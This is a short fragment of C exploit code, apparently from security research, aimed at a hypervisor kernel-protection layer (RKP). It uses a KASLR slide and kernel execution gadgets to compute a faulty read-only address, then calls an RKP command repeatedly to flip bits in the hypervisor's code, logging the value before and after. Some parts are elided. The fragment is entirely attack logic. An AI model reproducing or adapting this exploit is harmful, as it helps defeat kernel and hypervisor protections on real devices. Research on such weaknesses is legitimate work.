...
int main(void* (*dlopen)(const char*, int), void* (*dlsym)(void*, const char*)) {
  ...
  //Flipping bits in RKP using a faulty input address in the ro range
  unsigned long rkp_va = RKP_CODE_VIRT_ADDR + kaslr_slide;
  unsigned long rkp_bitmap_va = RKP_BITMAP_VIRT_ADDR + kaslr_slide;
  unsigned long va_offset = rkp_va - rkp_bitmap_va;
  unsigned long needed_index = va_offset / 8;
  unsigned long faulty_va = (needed_index << 18) + KERNEL_PHYS_BASE + PHYS_TO_VIRT_OFF;

  LOG("Before modification: 0x%lx", KEXEC1(READ_GADGET + kaslr_slide, rkp_va));
  int i=0;
  for (i=0; i<16; i++) {
  	KEXEC2(RKP_CALL + kaslr_slide, RKP_CMDID(0x51), faulty_va + i*0x1000);
  }
  LOG("After modification: 0x%lx", KEXEC1(READ_GADGET + kaslr_slide, rkp_va));
